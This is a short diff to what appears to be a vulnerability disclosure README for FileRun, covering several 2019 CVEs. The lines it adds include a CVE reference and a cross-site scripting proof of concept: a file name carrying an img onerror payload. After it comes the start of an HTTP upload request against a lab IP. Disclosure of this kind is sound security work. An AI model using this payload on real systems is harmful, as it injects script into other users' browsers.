@@ -3,6 +3,8 @@
 
 ## CVE-2019-12457 - CVE-2019-12458 - CVE-2019-12459 - CVE-2019-XXXXX
 
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-XXXXX
+
 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12457
 
 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12458
@@ -10,6 +12,8 @@ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12458
 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12459
 
 ### PoC - XSS
+To exploit vulnerability, someone could upload an allowed file named ```“><img src=x onerror=prompt(document.domain)>``` to impact users who open the page.
+
 ```
 POST /filerun/?module=fileman&section=do&page=up HTTP/1.1
 Host: 172.16.191.129
